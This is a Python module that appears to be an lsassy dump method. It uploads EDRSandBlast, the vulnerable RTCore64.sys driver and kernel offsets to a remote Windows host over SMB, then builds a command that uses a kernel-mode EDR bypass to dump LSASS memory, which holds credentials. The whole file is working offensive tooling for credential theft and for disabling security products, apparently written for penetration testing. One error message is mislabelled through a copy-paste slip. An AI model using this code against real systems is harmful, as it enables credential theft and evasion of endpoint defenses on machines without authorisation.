"""
https://github.com/wavestone-cdt/EDRSandblast
"""

import logging
import os

from lsassy.dumpmethod import IDumpMethod
from lsassy.impacketfile import ImpacketFile


class DumpMethod(IDumpMethod):
    def __init__(self, session, timeout):
        super().__init__(session, timeout)
        self.edrsandblast = "EDRSandBlast.exe"
        self.edrsandblast_path = False
        self.edrsandblast_remote_share = "C$"
        self.edrsandblast_remote_path = "\\Windows\\Temp\\"
        self.edrsandblast_uploaded = False

        self.RTCore64 = "RTCore64.sys"
        self.RTCore64_path = False
        self.RTCore64_remote_share = "C$"
        self.RTCore64_remote_path = "\\Windows\\Temp\\"
        self.RTCore64_uploaded = False

        self.ntoskrnl = "NtoskrnlOffsets.csv"
        self.ntoskrnl_path = False
        self.ntoskrnl_remote_share = "C$"
        self.ntoskrnl_remote_path = "\\Windows\\Temp\\"
        self.ntoskrnl_uploaded = False

    def prepare(self, options):
        self.edrsandblast_path = options.get("edrsandblast_path", self.edrsandblast_path)

        if not self.edrsandblast_path:
            logging.error("Missing edrsandblast_path")
            return None

        if not os.path.exists(self.edrsandblast_path):
            logging.error("{} does not exist.".format(self.edrsandblast_path))
            return None

        self.RTCore64_path = options.get("RTCore64_path", self.RTCore64_path)

        if not self.RTCore64_path:
            logging.error("Missing RTCore64_path")
            return None

        if not os.path.exists(self.RTCore64_path):
            logging.error("{} does not exist.".format(self.RTCore64_path))
            return None

        self.ntoskrnl_path = options.get("ntoskrnl_path", self.ntoskrnl_path)

        if not self.ntoskrnl_path:
            logging.error("Missing RTCore64_path")
            return None

        if not os.path.exists(self.ntoskrnl_path):
            logging.error("{} does not exist.".format(self.ntoskrnl_path))
            return None

        # Upload edrsandblast
        logging.debug('Copy {} to {}'.format(self.edrsandblast_path, self.edrsandblast_remote_path))
        with open(self.edrsandblast_path, 'rb') as p:
            try:
                self._session.smb_session.putFile(self.edrsandblast_remote_share, self.edrsandblast_remote_path + self.edrsandblast, p.read)
                logging.success("edrsandblast successfully uploaded")
                self.edrsandblast_uploaded = True
            except Exception as e:
                logging.error("edrsandblast upload error", exc_info=True)
                return None

        # Upload RTCore64
        logging.debug('Copy {} to {}'.format(self.RTCore64_path, self.RTCore64_remote_path))
        with open(self.RTCore64_path, 'rb') as p:
            try:
                self._session.smb_session.putFile(self.RTCore64_remote_share,
                                                  self.RTCore64_remote_path + self.RTCore64, p.read)
                logging.success("RTCore64 successfully uploaded")
                self.RTCore64_uploaded = True
            except Exception as e:
                logging.error("RTCore64 upload error", exc_info=True)
                self.clean_edrsandblast()
                return None

        # Upload NtoskrnlOffsets
        logging.debug('Copy {} to {}'.format(self.ntoskrnl_path, self.ntoskrnl_remote_path))
        with open(self.ntoskrnl_path, 'rb') as p:
            try:
                self._session.smb_session.putFile(self.ntoskrnl_remote_share,
                                                  self.ntoskrnl_remote_path + self.ntoskrnl, p.read)
                logging.success("NtoskrnlOffsets successfully uploaded")
                self.ntoskrnl_uploaded = True
                return True
            except Exception as e:
                logging.error("NtoskrnlOffsets upload error", exc_info=True)
                self.clean_edrsandblast()
                return None

    def clean_edrsandblast(self):
        if self.edrsandblast_uploaded:
            ImpacketFile.delete(self._session, self.edrsandblast_remote_path + self.edrsandblast, timeout=self._timeout)

    def clean_RTCore64(self):
        if self.RTCore64_uploaded:
            ImpacketFile.delete(self._session, self.RTCore64_remote_path + self.RTCore64, timeout=self._timeout)

    def clean_NtoskrnlOffsets(self):
        if self.ntoskrnl_uploaded:
            ImpacketFile.delete(self._session, self.ntoskrnl_remote_path + self.ntoskrnl, timeout=self._timeout)

    def clean(self):
        self.clean_edrsandblast()
        self.clean_RTCore64()
        self.clean_NtoskrnlOffsets()


    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        cmd_command = """{}{} dump --kernelmode --driver {}{} --nt-offsets {}{} -o {}{}""".format(
            self.edrsandblast_remote_path, self.edrsandblast,
            self.RTCore64_remote_path, self.RTCore64,
            self.ntoskrnl_remote_path, self.ntoskrnl,
            self.dump_path, self.dump_name
        )

        return {
            "cmd": cmd_command,
            "pwsh": cmd_command
        }
